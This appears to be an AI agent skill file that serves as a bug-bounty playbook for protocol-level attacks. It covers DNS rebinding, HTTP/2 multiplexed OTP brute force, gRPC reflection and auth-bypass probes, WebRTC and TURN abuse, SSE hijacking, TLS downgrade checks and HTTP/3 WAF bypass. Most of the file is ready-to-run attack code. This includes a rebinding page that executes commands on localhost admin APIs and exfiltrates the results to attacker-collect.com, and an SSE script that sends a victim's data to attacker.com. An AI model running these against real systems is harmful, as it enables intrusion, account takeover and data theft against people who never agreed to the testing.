---
name: hunt-protocol-attacks
description: Advanced protocol-level attacks — DNS rebinding, HTTP/2 rapid reset (CVE-2023-44487), HPACK bomb, gRPC-Web specific, WebRTC IP leak exploitation, server-sent events abuse, HTTP/3 QUIC fingerprinting bypass, TCP/TLS downgrade. Use on hardened targets where application-layer attacks are blocked and protocol-level bypasses are needed.
tags: [protocol, dns-rebinding, http2, rapid-reset, hpack, grpc-web, webrtc, sse, quic, http3, tls-downgrade]
version: 1.0.0
license: MIT
triggers: [hunt, protocol, attacks, dns-rebinding, http2, rapid-reset, hpack, grpc-web, webrtc, sse, quic, http3, tls-downgrade]
---

# Protocol-Level Attacks — Advanced Bug Bounty

## 1. DNS REBINDING ATTACKS

### What It Is
```
DNS rebinding exploits same-origin policy (SOP) using DNS:
1. Attacker controls evil.com DNS → resolves to attacker IP
2. Victim visits evil.com (cached as attacker IP)
3. Attacker DNS TTL=1s — immediately rebinds evil.com → victim's local IP (127.0.0.1)
4. evil.com page makes XMLHttpRequest to evil.com → now hits localhost
5. Browser thinks: "same origin (evil.com)" → allows request
6. Bypasses SOP for internal/local services!
```

### Attack Setup
```python
# Use rebinder.net or implement your own DNS rebinding server

# Targets vulnerable to DNS rebinding:
# - Local admin panels (router admin at 192.168.1.1)
# - Kubernetes dashboard (localhost:8001)
# - Docker API (localhost:2375)
# - Jenkins (localhost:8080)
# - Any internal service accessible from victim's network

# Step 1: Serve malicious page
# evil.com/attack.html:
attack_html = """
<script>
function attack() {
  // After rebinding: evil.com now points to 127.0.0.1
  fetch('http://evil.com:8080/api/admin/execute', {
    method: 'POST',
    body: JSON.stringify({cmd: 'whoami'})
  }).then(r => r.text()).then(data => {
    fetch('https://attacker-collect.com/result?d=' + btoa(data));
  });
}

// Wait for DNS to rebind
setTimeout(attack, 15000);  // 15 seconds for TTL to expire
</script>
"""

# Step 2: Wait for victim to visit evil.com
# Step 3: DNS switches to 127.0.0.1 after TTL
# Step 4: XHR goes to localhost:8080 with victim's cookies
```

### DNS Rebinding for Bug Bounty
```
Use case: SSRF limitation bypass
- Target has SSRF but blocks 127.0.0.1, 169.254.x.x, 10.x.x.x
- DNS rebinding: use domain that resolves to these IPs after rebind
- Bypasses IP-based blocklists in SSRF filters

Tools:
- https://lock.cmpxchg8b.com/rebinder.html — instant rebinding service
- nip.io / sslip.io — DNS wildcards (*.127.0.0.1.nip.io → 127.0.0.1)
  But: many targets block *.nip.io — use custom domain

Custom DNS rebinding server:
pip install dnslib
# Implement DNS server that alternates A records
```

---

## 2. HTTP/2 RAPID RESET (CVE-2023-44487)

### Overview
```
HTTP/2 allows multiple streams on one connection.
Rapid Reset: Client opens stream, immediately sends RST_STREAM cancel.
Before server processes RST, it already handled request.
Net effect: Amplified request throughput with minimal client effort.

Bug bounty relevance:
1. Rate limit bypass: Server counts requests by RST_STREAM cancel, 
   not actual processing → bypass per-IP rate limits
2. DoS potential (usually out of scope but affects target availability)
3. Authentication bypass: Race window in RST processing
```

### Rate Limit Bypass via HTTP/2 Multiplexing
```python
# HTTP/2 multiplexing: send many requests in parallel on one connection
# Rate limiter sees 1 connection (1 client) but processes 100 requests

import httpx, asyncio

async def http2_burst(url, payloads, concurrent=100):
    """Send burst of requests via HTTP/2 multiplexing to bypass rate limiting"""
    async with httpx.AsyncClient(http2=True) as client:
        tasks = [
            client.post(url, json=payload, headers={"Authorization": f"Bearer TOKEN"})
            for payload in payloads
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
    return results

# Use case: OTP brute force
# Rate limit: 5 attempts per minute per IP
# HTTP/2 burst: 100 attempts simultaneously → rate limit only logs 1 connection event

otp_payloads = [{"otp": str(i).zfill(6)} for i in range(0, 100)]  # 000000-000099
asyncio.run(http2_burst("https://target.com/api/verify-otp", otp_payloads))
```

---

## 3. HPACK BOMB

```python
# HTTP/2 HPACK header compression vulnerability
# Large decompressed header table from small compressed input
# Can cause server OOM or bypass header size limits

# Craft HPACK bomb payload (for testing only, carefully)
# Headers that expand massively when decompressed:
# Practical impact: bypass header-based WAF rules
# WAF sees compressed small header → passes
# Backend sees decompressed large header → processes

# Testing WAF header inspection via compressed headers:
import h2.connection, h2.config, h2.events
import socket, ssl

def send_compressed_header_test(host, port, header_value):
    """Test if WAF inspects compressed vs decompressed headers"""
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(['h2'])
    
    sock = socket.create_connection((host, port))
    ssock = ctx.wrap_socket(sock, server_hostname=host)
    
    config = h2.config.H2Configuration(client_side=True)
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    ssock.sendall(conn.data_to_send(65535))
    
    headers = [
        (':method', 'GET'),
        (':path', '/'),
        (':scheme', 'https'),
        (':authority', host),
        ('x-custom-payload', header_value),  # Potentially malicious value
    ]
    
    conn.send_headers(1, headers)
    ssock.sendall(conn.data_to_send(65535))
```

---

## 4. gRPC-WEB SPECIFIC ATTACKS

### gRPC-Web Architecture
```
gRPC-Web: HTTP/1.1 or HTTP/2 transport for gRPC
Typically: Browser → gRPC-Web proxy → gRPC backend
Envoy proxy is common gRPC-Web frontend

Content-Type for gRPC-Web:
- application/grpc-web
- application/grpc-web+proto
- application/grpc-web-text (base64 encoded)
```

### gRPC Reflection Exploitation
```python
import grpc
from grpc_reflection.v1alpha import reflection_pb2, reflection_pb2_grpc

def enumerate_grpc_services(host, port):
    """Enumerate gRPC services via reflection (if enabled)"""
    channel = grpc.insecure_channel(f'{host}:{port}')
    stub = reflection_pb2_grpc.ServerReflectionStub(channel)
    
    # List all services
    response = stub.ServerReflectionInfo(iter([
        reflection_pb2.ServerReflectionRequest(list_services="")
    ]))
    
    for r in response:
        if r.HasField('list_services_response'):
            for service in r.list_services_response.service:
                print(f"Service: {service.name}")
                # Then enumerate methods per service
                file_resp = stub.ServerReflectionInfo(iter([
                    reflection_pb2.ServerReflectionRequest(
                        file_containing_symbol=service.name
                    )
                ]))
                # Parse proto descriptors for method names

# gRPC-Web attack: transcoding bypass
# gRPC-Web proxy transcodes between HTTP/1.1 and gRPC
# Test: Send malformed framing to bypass validation
# Frame format: 1 byte flags + 4 bytes length + payload

import struct, base64, requests

def grpc_web_request(url, proto_payload):
    """Send gRPC-Web request"""
    # gRPC-Web frame: compressed-flag (1 byte) + length (4 bytes) + data
    frame = struct.pack('>BI', 0, len(proto_payload)) + proto_payload
    
    r = requests.post(url,
        data=frame,
        headers={
            'Content-Type': 'application/grpc-web+proto',
            'X-Grpc-Web': '1',
        }
    )
    return r
```

### gRPC Auth Bypass Patterns
```python
# gRPC metadata = HTTP headers
# Test: Remove authentication metadata, check if required
import grpc

def test_grpc_auth_bypass(host, port, method):
    """Test if gRPC endpoint requires auth metadata"""
    channel = grpc.insecure_channel(f'{host}:{port}')
    
    # Without credentials
    try:
        # Direct binary call
        response = channel.unary_unary(
            f'/{method}',
            request_serializer=bytes,
            response_deserializer=bytes
        )(b'', timeout=5)
        print(f"UNAUTHENTICATED ACCESS: {response}")
    except grpc.RpcError as e:
        print(f"Auth required: {e.code()}")

# gRPC method enumeration:
# Common gRPC admin methods
GRPC_ADMIN_METHODS = [
    '/UserService/GetAllUsers',
    '/AdminService/GetUsers',
    '/InternalService/DumpDatabase',
    '/HealthService/Check',
    '/ReflectionService/ServerReflectionInfo',
    '/grpc.health.v1.Health/Check',
]
```

---

## 5. WebRTC IP LEAK EXPLOITATION

### IP Leak via WebRTC
```javascript
// WebRTC reveals local IP even behind VPN
// Bug bounty: if target says "we don't log your IP" but WebRTC leaks it

function getWebRTCIPs(callback) {
    const pc = new RTCPeerConnection({
        iceServers: [{urls: "stun:stun.l.google.com:19302"}]
    });
    
    const ips = new Set();
    pc.createDataChannel("");
    
    pc.onicecandidate = (event) => {
        if (!event.candidate) return;
        
        const match = event.candidate.candidate.match(
            /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
        );
        if (match) {
            ips.add(match[1]);
            callback([...ips]);
        }
    };
    
    pc.createOffer().then(offer => pc.setLocalDescription(offer));
}

getWebRTCIPs(ips => console.log("Real IPs:", ips));
// Leaks: local network IP (192.168.x.x), sometimes VPN internal IP
```

### TURN Server Abuse
```python
# TURN server: relay for WebRTC when direct connection fails
# Misconfigured TURN = open proxy for any TCP/UDP traffic

import requests

def test_turn_server_abuse(turn_host, turn_port, username, password):
    """Test if TURN server can be abused as open proxy"""
    
    # TURN allocation request
    # If successful without proper auth = open TURN
    # Use TURN to relay traffic to internal services
    
    # Practical test with turnutils_uclient
    import subprocess
    result = subprocess.run([
        'turnutils_uclient',
        '-v', '-t',  # TCP, verbose
        '-u', username,
        '-w', password,
        '-p', str(turn_port),
        '-r', '127.0.0.1',  # Try to reach localhost via TURN
        '-q', '1',
        turn_host
    ], capture_output=True, text=True, timeout=10)
    
    print(result.stdout)
    # If you can allocate TURN relay to localhost → SSRF via TURN
```

---

## 6. SERVER-SENT EVENTS (SSE) EXPLOITATION

### SSE Security Issues
```javascript
// SSE: One-way server→client streaming
// Bug patterns:

// 1. SSE without authentication
// EventSource doesn't send cookies by default... wait, yes it does
const es = new EventSource('https://target.com/api/sse/events');
// Cookies ARE sent (same-site cookie rules apply)
// But: no CORS preflight for SSE (EventSource)
// If target CORS policy reflects origin → cross-origin SSE read

// 2. Cross-origin SSE read
// From attacker.com:
const es = new EventSource('https://target.com/api/events', {
    withCredentials: true  // Send victim's cookies
});
es.onmessage = (e) => {
    // Receive victim's real-time notifications, messages, data
    fetch('https://attacker.com/collect?data=' + btoa(e.data));
};

// 3. XSS via SSE data
// If server sends data without escaping and client renders as HTML
es.onmessage = (e) => {
    document.getElementById('feed').innerHTML += e.data;  // XSS if data contains <script>
};
```

### SSE Authentication Testing
```python
import requests, sseclient

def test_sse_auth(url, cookies=None, headers=None):
    """Test SSE endpoint with various auth states"""
    
    # Test 1: No auth
    r = requests.get(url, stream=True, headers={'Accept': 'text/event-stream'})
    client = sseclient.SSEClient(r)
    for event in client.events():
        print(f"Unauthenticated SSE event: {event.data[:100]}")
        break
    
    # Test 2: Wrong user's cookies (IDOR via SSE)
    # Get another user's SSE stream
    r2 = requests.get(
        url.replace('/my-events', '/events/OTHER_USER_ID'),
        stream=True,
        headers={'Accept': 'text/event-stream'},
        cookies={'session': MY_SESSION}
    )
```

---

## 7. TLS/SSL DOWNGRADE ATTACKS

### SSL Stripping and Downgrade
```bash
# Test for TLS downgrade acceptance
# Modern: TLS 1.3 only (secure)
# Vulnerable: also accepts TLS 1.0/1.1

# Check supported TLS versions
nmap --script ssl-enum-ciphers -p 443 target.com

# Force TLS 1.0 (if accepted, data at risk from BEAST/POODLE)
curl --tls-max 1.0 https://target.com -v

# SSLScan full audit
sslscan --no-colour target.com:443

# testssl.sh comprehensive
testssl.sh --severity HIGH --quiet target.com

# What to look for:
# - POODLE: SSLv3 supported
# - BEAST: TLS 1.0 + CBC cipher
# - CRIME/BREACH: compression enabled
# - Heartbleed: OpenSSL < 1.0.1g
# - ROBOT: RSA key exchange with PKCS#1 v1.5 padding oracle

# HSTS bypass
# If HSTS not preloaded, first connection can be downgraded
# Target: http://target.com → does it redirect to https?
# If yes but HSTS not in browser preload list → first visit vulnerable to MITM
curl -I http://target.com  # 301 to HTTPS?
# Check HSTS preload: https://hstspreload.org/?domain=target.com
```

---

## 8. HTTP/3 QUIC BYPASS

```python
# HTTP/3 uses QUIC (UDP) instead of TCP
# WAFs may not inspect UDP traffic
# If target supports HTTP/3, WAF might only filter TCP

# Check if target supports HTTP/3
# curl with HTTP/3 support
curl --http3 https://target.com/api/sensitive

# Python with aioquic (see memory notes for eToro rig pattern)
import asyncio
from aioquic.asyncio import connect
from aioquic.h3.connection import H3Connection

async def http3_request(host, port, path):
    """Send HTTP/3 request bypassing TCP-only WAF"""
    async with connect(host, port, configuration=QuicConfiguration(is_client=True)) as conn:
        h3 = H3Connection(conn)
        stream_id = conn.get_next_available_stream_id()
        h3.send_headers(
            stream_id=stream_id,
            headers=[
                (b':method', b'GET'),
                (b':scheme', b'https'),
                (b':authority', host.encode()),
                (b':path', path.encode()),
                (b'x-evil-payload', b'<script>alert(1)</script>'),
            ]
        )
        # If WAF only on TCP and payload passes through UDP → WAF bypass

asyncio.run(http3_request("target.com", 443, "/api/admin"))
```

---

## WORKFLOW

```
PHASE 1: PROTOCOL DETECTION
├── Check HTTP version: curl -I --http2 target.com (look for HTTP/2 in response)
├── Check HTTP/3: curl --http3 target.com
├── Check gRPC: look for Content-Type: application/grpc
├── Check WebRTC: JS source for RTCPeerConnection usage
├── Check SSE: JS source for EventSource usage
└── TLS audit: testssl.sh target.com

PHASE 2: PROTOCOL-SPECIFIC TESTS
├── HTTP/2 → multiplexing for rate limit bypass
├── gRPC → reflection enabled? direct backend access?
├── WebRTC → IP leak? TURN server abuse?
├── SSE → cross-origin read? auth bypass?
├── DNS → rebinding against internal services?
└── TLS → downgrade? weak ciphers?

PHASE 3: CHAIN WITH APP-LAYER BUGS
├── DNS rebinding + SSRF filter bypass
├── HTTP/2 multiplexing + OTP brute force
├── gRPC reflection + unauthenticated admin call
├── WebRTC TURN + SSRF to internal
└── HTTP/3 + WAF payload bypass
```
